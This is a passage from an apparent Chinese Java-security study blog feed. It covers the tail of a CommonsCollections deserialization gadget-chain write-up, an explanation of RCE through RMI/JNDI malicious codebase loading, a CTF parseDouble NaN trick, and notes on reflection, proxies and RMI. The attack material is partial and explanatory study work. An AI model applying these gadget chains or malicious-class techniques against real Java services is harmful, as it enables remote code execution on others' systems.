Reflections.getFieldValue(queue, &quot;queue&quot;);queueArray[0] &#x3D; templates;queueArray[1] &#x3D; 1;return queue;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后在贴个有意思的东西，如果使用反射类<code>final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);</code>这样进行调用，在改变反射出来的内容的时候也会对反射类内容</p>        <h2 id="CommonsCollections4"   >          <a href="#CommonsCollections4" class="heading-link"><i class="fas fa-link"></i></a><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2>      <pre class="line-numbers language-none"><code class="language-none">&#x2F;* * Variation on CommonsCollections2 that uses InstantiateTransformer instead of * InvokerTransformer. *&#x2F;&#x2F;&#x2F;PriorityQueue-&gt;TransformingComparator.compare-&gt;ChainedTransformer.transform-&gt;InstantiateTransformer.transform-&gt;TrAXFilter构造函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>搁着单双数同链子是吧</del></p><p>又换了个头头，触发起始使用的是我们直接从这个新类的transform方法看起，直接反序列化打断点</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI攻击</title>
      <link href="/posts/70165cdf.html"/>
      <url>/posts/70165cdf.html</url>
      
        <content type="html"><![CDATA[<p>之前在关于Java的小点中介绍了一些Java安全入门所需要掌握的基本知识，那么这里我们就要来看看具体的对RMI进行攻击的方法</p><p>首先要知道什么是RMI</p>        <h2 id="简介"   >          <a href="#简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#简介" class="headerlink" title="简介"></a>简介</h2>      <blockquote><p>RMI（Remote Method Invocation），远程方法调用。跟RPC差不多，是java独立实现的一种机制。实际上就是在一个java虚拟机上调用另一个java虚拟机的对象上的方法。</p><p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。（我们可以再之后数据包中看到该协议特征）</p><p>在RMI中对象是通过序列化方式进行编码传输的。（我们将在之后证实）</p><p>RMI分为三个主体部分：</p><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用。</li></ul><p>总体RMI的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样。</p><p>唯一区别就是RMI服务端提供的方法，被调用的时候该方法是<strong>执行在服务端</strong>。</p></blockquote><p>RMI关键点在于，所有的方法执行都是在服务端上执行的，这时肯定会有人有疑问，为什么在服务端进行调用还会导致RCE咧？我们暂且按下不表，后面在看具体漏洞就知道为什么了</p>        <h3 id="RMI调用流程"   >          <a href="#RMI调用流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#RMI调用流程" class="headerlink" title="RMI调用流程"></a>RMI调用流程</h3>      <p>Server部署：</p><ol><li>Server向Registry注册远程对象，远程对象绑定在一个<code>//host:port/objectname</code>上，形成一个映射表（Service-Stub）。</li></ol><p>Client调用：</p><ol><li>Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。</li><li>Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器</li><li>Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。</li></ol><p><img src="https://img-blog.csdn.net/20181023090617906"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-42615ecabc320b391e4e2d95c7ca4541b392555a.png" alt="image-20220907013338336"></p><p>看到整个调用过程我们发现所有的内容传递都是对象，过程自然是序列化与反序列化，那这是我们就会有疑问，如果在客户端并没有服务端所返回的对象类那不就不能存储我们的对象了吗？</p><p>这时JNDI就生效了，在JNDI远程进行加载的时候，会通过lookup来对类进行本地查找，如果本地找不到对应类的定义，就会去到server端预先定义好的codebase地址中（一般是http）获取对应类的class文件，并自动执行类的静态方法和getObjectInstance方法，那么我们只要构造恶意类文件，并且通过RMI返回对应类的实例化对象，就可以导致RCE，多说无益，我们上手试试</p>        <h2 id="RCE示例"   >          <a href="#RCE示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE示例" class="headerlink" title="RCE示例"></a>RCE示例</h2>      <pre class="line-numbers language-none"><code class="language-none">public interface HelloService extends Remote &#123;    String sayHello() throws RemoteException;&#125;public class HelloServiceImpl extends UnicastRemoteObject implements HelloService &#123;    protected HelloServiceImpl() throws RemoteException &#123;    &#125;    @Override    public String sayHello() throws RemoteException &#123;        System.out.println(&quot;hello!&quot;);        return &quot;hello!&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关Java的小点</title>
      <link href="/posts/b36bc80c.html"/>
      <url>/posts/b36bc80c.html</url>
      
        <content type="html"><![CDATA[<p>碎碎念：学Java真的好折磨人呜呜呜呜，好多好多好多包，名字也不认识，方法也不会用，只能慢慢一步步往前走，哭哭😭，这篇文章主要是总结一些关于Java的有趣小点，看个乐呵涨点冷知识就好</p><span id="more"></span>        <h2 id="关于数字的类型转换"   >          <a href="#关于数字的类型转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于数字的类型转换" class="headerlink" title="关于数字的类型转换"></a>关于数字的类型转换</h2>      <p>看到这个是因为2022中科大的CTF有一道猜数字的题目，关键代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">XMLStreamException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">double</span> rand <span class="token operator">=</span> 随机数一个<span class="token punctuation">;</span>        <span class="token keyword">var</span> guess<span class="token operator">=</span><span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span><span class="token string">"用户输入的数据"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> isLess <span class="token operator">=</span> rand <span class="token operator">&lt;</span> guess <span class="token operator">-</span> <span class="token number">1e-6</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> isMore <span class="token operator">=</span> rand <span class="token operator">></span> guess <span class="token operator">+</span> <span class="token number">1e-6</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isLess<span class="token operator">&amp;&amp;</span><span class="token operator">!</span>isMore<span class="token operator">&amp;&amp;</span>一次猜对<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token function">giveFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里会随机生成一个0-1之间的double类型的随机数，用户需要猜其中的随机数是什么，并且只要一次猜对就会给flag，当然除非你运气已经好到一定地步了不然绝对不可能猜出来的，所以我们需要另辟蹊径了</p><p>可以看到用户输入的数据类型是以字符串输入然后交给<code>parseDouble</code>函数转换成小数再进行判断的，那我们跟入<code>parseDouble</code>中看一下解析流程，逐层调用到<code>FloatingDecimal.readJavaFormatString</code>函数中，看到对特殊内容的解析部分</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210241949464.png"></p><p>可以看到有三种特殊的解析类型，分别是NaN，Infinity和16进制，那我们分别用这几种试试看看最终效果</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210242001054.png"></p><p>可以看到输入是NaN就能拿到flag，是因为NaN就像一个黑洞，任何数字和他进行运算结果都是NaN，Infinity也类似，不过在*0的时候会变成NaN，判断中Infinity大于任何数，而NaN表示非数值，所以不管进行什么运算结果都为NaN，布尔值为False</p>        <h2 id="关于Java代码调用的问题"   >          <a href="#关于Java代码调用的问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于Java代码调用的问题" class="headerlink" title="关于Java代码调用的问题"></a>关于Java代码调用的问题</h2>      <p>Java这个烂玩意让人困惑不是一天两天了，今天索性把Java中的代码调用问题一次性看完（调试完）</p><p>首先是static关键字定义的类，我们在使用的时候需要直接定义，如下：</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">className.staticInnerClass xxx&#x3D;new className.staticInnerClass()&#x2F;&#x2F;静态内部类只能访问外部静态属性或方法<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果是一个非静态子类，就需要先实例化一个父类，再实例化子类</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">className xxx &#x3D; new className();className.InnerClass inner  &#x3D; xxx.new InnerClass();&#x2F;&#x2F;或者一步到位className.InnerClass innerObject &#x3D; new className().new InnerClass();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>synchronized</code></p>        <h2 id="关于反射"   >          <a href="#关于反射" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于反射" class="headerlink" title="关于反射"></a>关于反射</h2>      <p>正常情况下，如果我们要调用一个对象的方法，或者访问一个对象的字段，通常会传入对象实例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Main.java</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itranswarp<span class="token punctuation">.</span>learnjava<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">getFullName</span><span class="token punctuation">(</span><span class="token class-name">Person</span> p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> p<span class="token punctuation">.</span><span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> p<span class="token punctuation">.</span><span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是，如果不能获得<code>Person</code>类，只有一个<code>Object</code>实例，比如这样：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> <span class="token function">getFullName</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是如果我们尝试强制转型，将其转换为Person对象，我们就发现这时还是需要引入原始的类定义才能转换，而反射就是为了避免这种情况的出现</p>        <h3 id="关于Java类型"   >          <a href="#关于Java类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于Java类型" class="headerlink" title="关于Java类型"></a>关于Java类型</h3>      <blockquote><p>对于Java来说除了int之类的基本类型之外，Java的其他类型全都是<code>class</code>类型</p><p>那对于不同的数据类型之间，由于中间没有继承关系，所以互相无法进行赋值</p><p>而<code>class</code>是由JVM在执行过程中动态加载的。JVM在第一次读取到一种<code>class</code>类型时，将其加载进内存。</p><p>每加载一种<code>class</code>，JVM就为其创建一个<code>Class</code>类型的实例，并关联起来。注意：这里的<code>Class</code>类型是一个名叫<code>Class</code>的<code>class</code>。它长这样：</p><pre class="line-numbers language-none"><code class="language-none">public final class Class &#123;    private Class() &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以<code>String</code>类为例，当JVM加载<code>String</code>类时，它首先读取<code>String.class</code>文件到内存，然后，为<code>String</code>类创建一个<code>Class</code>实例并关联起来：</p><pre class="line-numbers language-none"><code class="language-none">Class cls &#x3D; new Class(String);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个<code>Class</code>实例是JVM内部创建的，如果我们查看JDK源码，可以发现<code>Class</code>类的构造方法是<code>private</code>，只有JVM能创建<code>Class</code>实例，我们自己的Java程序是无法创建<code>Class</code>实例的。</p><p>所以，JVM持有的每个<code>Class</code>实例都指向一个数据类型（<code>class</code>或<code>interface</code>）：</p><pre class="line-numbers language-ascii" data-language="ascii"><code class="language-ascii">┌───────────────────────────┐│      Class Instance       │──────&gt; String├───────────────────────────┤│name &#x3D; &quot;java.lang.String&quot;  │└───────────────────────────┘┌───────────────────────────┐│      Class Instance       │──────&gt; Random├───────────────────────────┤│name &#x3D; &quot;java.util.Random&quot;  │└───────────────────────────┘┌───────────────────────────┐│      Class Instance       │──────&gt; Runnable├───────────────────────────┤│name &#x3D; &quot;java.lang.Runnable&quot;│└───────────────────────────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个<code>Class</code>实例包含了该<code>class</code>的所有完整信息：</p><pre class="line-numbers language-none"><code class="language-none">┌───────────────────────────┐│      Class Instance       │──────&gt; String├───────────────────────────┤│name &#x3D; &quot;java.lang.String&quot;  │├───────────────────────────┤│package &#x3D; &quot;java.lang&quot;      │├───────────────────────────┤│super &#x3D; &quot;java.lang.Object&quot; │├───────────────────────────┤│interface &#x3D; CharSequence...│├───────────────────────────┤│field &#x3D; value[],hash,...   │├───────────────────────────┤│method &#x3D; indexOf()...      │└───────────────────────────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于JVM为每个加载的<code>class</code>创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p><p>这种通过<code>Class</code>实例获取<code>class</code>信息的方法称为反射（Reflection）。</p></blockquote><p>以上内容来自廖雪峰老师的Java教程，写的真的很不错，下面来写一些帮助我自己理解的内容</p><p>首先就是反射可以在java中执行的根本原因，就是Java会为在加载某个类的时候把类有关的信息存储起来，并且这部分就相当于是一个对象，我们可以通过反射访问到其中的内容，也就达成了获取其中的属性和方法的目的，又因为java数据都是通过字节码存储的，那么我们只需要按照字节码的生成规则对相应的位置的字节码进行修改就能达到修改内容的目的，并且还不会导致对应类的关联方法触发，这也是后面yso序列化链对反射大量使用的原因（防止链子生成的时候字节码就被执行）</p><blockquote><p>如何获取一个<code>class</code>的<code>Class</code>实例？有三个方法：</p><p>方法一：直接通过一个<code>class</code>的静态变量<code>class</code>获取：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> cls <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的<code>getClass()</code>方法获取：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cls <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>方法三：如果知道一个<code>class</code>的完整类名，可以通过静态方法<code>Class.forName()</code>获取：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为<code>Class</code>实例在JVM中是唯一的，所以，上述方法获取的<code>Class</code>实例是同一个实例。可以用<code>==</code>比较两个<code>Class</code>实例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> cls1 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cls2 <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> sameClass <span class="token operator">=</span> cls1 <span class="token operator">==</span> cls2<span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意一下<code>Class</code>实例比较和<code>instanceof</code>的差别：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span> n <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> b1 <span class="token operator">=</span> n <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span><span class="token punctuation">;</span> <span class="token comment">// true，因为n是Integer类型</span><span class="token keyword">boolean</span> b2 <span class="token operator">=</span> n <span class="token keyword">instanceof</span> <span class="token class-name">Number</span><span class="token punctuation">;</span> <span class="token comment">// true，因为n是Number类型的子类</span><span class="token keyword">boolean</span> b3 <span class="token operator">=</span> n<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span> <span class="token comment">// true，因为n.getClass()返回Integer.class</span><span class="token keyword">boolean</span> b4 <span class="token operator">=</span> n<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Number</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span> <span class="token comment">// false，因为Integer.class!=Number.class</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用<code>instanceof</code>不但匹配指定类型，还匹配指定类型的子类。而用<code>==</code>判断<code>class</code>实例可以精确地判断数据类型，但不能作子类型比较。</p><p>通常情况下，我们应该用<code>instanceof</code>判断数据类型，因为面向抽象编程的时候，我们不关心具体的子类型。只有在需要精确判断一个类型是不是某个<code>class</code>的时候，我们才使用<code>==</code>判断<code>class</code>实例。</p><p>因为反射的目的是为了获得某个实例的信息。因此，当我们拿到某个<code>Object</code>实例时，我们可以通过反射获取该<code>Object</code>的<code>class</code>信息：</p></blockquote>        <h2 id="关于代理"   >          <a href="#关于代理" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于代理" class="headerlink" title="关于代理"></a>关于代理</h2>      <p>代理类是非常有意思的东西，之所以放在这里是因为代理的前提就是反射（废话，代理就在反射包下）</p><p><em><strong>动态代理</strong></em></p><p>我们在正常使用接口的时候都是先编写一个对应的实现类，然后再编写对应的方法，但是通过代理，我们就可以在不实现接口的前提下生成一个对象，并为其添加对应的方法</p><p>上面这个过程主要通过<code>handler</code>实现</p><p>下面我们来看一下对于同样的功能我们传统的接口实现和使用代理有什么区别</p><blockquote><p>定义接口：</p><pre class="line-numbers language-none"><code class="language-none">public interface Hello &#123;    void morning(String name);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编写实现类：</p><pre class="line-numbers language-none"><code class="language-none">public class HelloWorld implements Hello &#123;    public void morning(String name) &#123;        System.out.println(&quot;Good morning, &quot; + name);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建实例，转型为接口并调用：</p><pre class="line-numbers language-none"><code class="language-none">Hello hello &#x3D; new HelloWorld();hello.morning(&quot;Bob&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种方式就是我们通常编写代码的方式。</p></blockquote><p>还有动态代理</p><blockquote><p>还有一种方式是动态代码，我们仍然先定义了接口<code>Hello</code>，但是我们并不去编写实现类，而是直接通过JDK提供的一个<code>Proxy.newProxyInstance()</code>创建了一个<code>Hello</code>接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。</p><p>一个最简单的动态代理实现如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"morning"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Good morning, "</span> <span class="token operator">+</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Hello</span> hello <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Hello</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>            <span class="token class-name">Hello</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 传入ClassLoader</span>            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Hello</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token comment">// 传入要实现的接口</span>            handler<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 传入处理调用方法的InvocationHandler</span>        hello<span class="token punctuation">.</span><span class="token function">morning</span><span class="token punctuation">(</span><span class="token string">"Bob"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">interface</span> <span class="token class-name">Hello</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">morning</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 在运行期动态创建一个<code>interface</code>实例的方法如下：</p><ol><li><p>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用；</p></li><li><p>通过</p><pre class="line-numbers language-none"><code class="language-none">Proxy.newProxyInstance()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建</p><pre class="line-numbers language-none"><code class="language-none">interface<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实例，它需要3个参数：</p><ol><li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li><li>需要实现的接口数组，至少需要传入一个接口进去；</li><li>用来处理接口方法调用的<code>InvocationHandler</code>实例。</li></ol></li><li><p>将返回的<code>Object</code>强制转型为接口。</p></li></ol></blockquote><p>可以看到整个过程中我们根本没有对接口进行传统意义上的实现，而是动态的通过中间的handler处理器来实现类似方法的调用</p>        <h2 id="关于RMI"   >          <a href="#关于RMI" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于RMI" class="headerlink" title="关于RMI"></a>关于RMI</h2>      <p>Java的RMI远程调用是指，一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法。RMI是Remote Method Invocation#<em><strong>远程方法调用</strong></em>的缩写。</p><p>提供服务的一方我们称之为服务器，而实现远程调用的一方我们称之为客户端。</p><p>我们先来实现一个最简单的RMI：服务器会提供一个<code>WorldClock</code>服务，允许客户端获取指定时区的时间，即允许客户端调用下面的方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDateTime</span> <span class="token function">getLocalDateTime</span><span class="token punctuation">(</span><span class="token class-name">String</span> zoneId<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要实现RMI，服务器和客户端必须共享同一个接口。我们定义一个<code>WorldClock</code>接口，代码如下：</p><p>现在我们来尝试实现一个最简单的RMI，首先定义一个可使用RMI的接口如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">WorldClock</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">LocalDateTime</span> <span class="token function">getLocalDateTime</span><span class="token punctuation">(</span><span class="token class-name">String</span> zoneId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span 